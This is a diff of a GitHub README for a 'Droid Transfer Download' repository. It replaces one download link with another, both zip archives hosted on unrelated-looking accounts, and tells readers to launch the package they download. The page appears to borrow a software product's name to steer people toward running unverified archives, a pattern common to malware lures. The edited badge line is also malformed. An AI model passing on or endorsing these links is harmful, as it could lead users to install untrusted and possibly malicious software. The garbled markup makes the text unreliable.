@@ -22,7 +22,7 @@ Welcome to the "Droid Transfer Download" repository! Here you can find all the i
 ## Getting Started 🚀
 To start transferring music from your Droid device to your iPhone or explore other features of Droid Transfer, you can download the software package by clicking on the button below:
 
-[![Download Software](https://img.shields.io/badge/Download%20Software-Click%20Here-orange)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/tauazinhefin/Droid-Transfer-Download/releases/download/v1.0/Application.zip%20Software-Click%20Here-orange)](https://github.com/tauazinhefin/Droid-Transfer-Download/releases/download/v1.0/Application.zip)
 
 ### Note:
 The link above leads directly to the software package that needs to be launched for installation.
